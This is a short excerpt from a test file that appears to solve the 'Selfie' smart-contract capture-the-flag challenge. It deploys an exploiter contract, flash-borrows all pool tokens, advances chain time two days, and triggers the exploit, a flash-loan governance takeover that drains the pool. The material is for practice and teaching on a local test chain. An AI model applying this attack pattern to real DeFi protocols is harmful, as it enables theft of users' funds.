...
describe("[Challenge] Selfie", function () {
  ...
  it("Execution", async function () {
    ...
    const governanceExploiter = await (
      await ethers.getContractFactory("GovernanceExploiter", player)
    ).deploy(pool.address, governance.address, token.address, player.address);
    await governanceExploiter.flashBorrow(TOKENS_IN_POOL);
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
    await governanceExploiter.exploit();
  });
